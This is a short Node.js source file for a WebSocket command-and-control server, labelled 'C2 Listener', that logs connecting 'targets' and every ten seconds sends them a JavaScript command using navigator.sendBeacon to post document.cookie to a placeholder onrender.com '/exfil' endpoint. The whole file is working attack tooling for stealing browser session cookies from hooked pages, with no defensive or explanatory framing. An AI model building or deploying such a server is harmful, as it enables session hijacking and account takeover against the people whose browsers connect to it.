const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('C2 Server Active\n');
});

const wss = new WebSocket.Server({ server });

console.log('[*] WebSocket C2 Listener active...');

wss.on('connection', (ws, req) => {
    const ip = req.socket.remoteAddress;
    console.log(`[+] Target connected from ${ip}`);

    ws.on('message', (message) => {
        console.log(`[Data] ${message.toString()}`);
    });

    const interval = setInterval(() => {
        const cmd = "navigator.sendBeacon('https://YOUR_RENDER_URL.onrender.com/exfil', document.cookie);";
        ws.send(cmd);
    }, 10000);

    ws.on('close', () => {
        clearInterval(interval);
        console.log(`[-] Target disconnected: ${ip}`);
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`[*] Server running on port ${PORT}`);
});
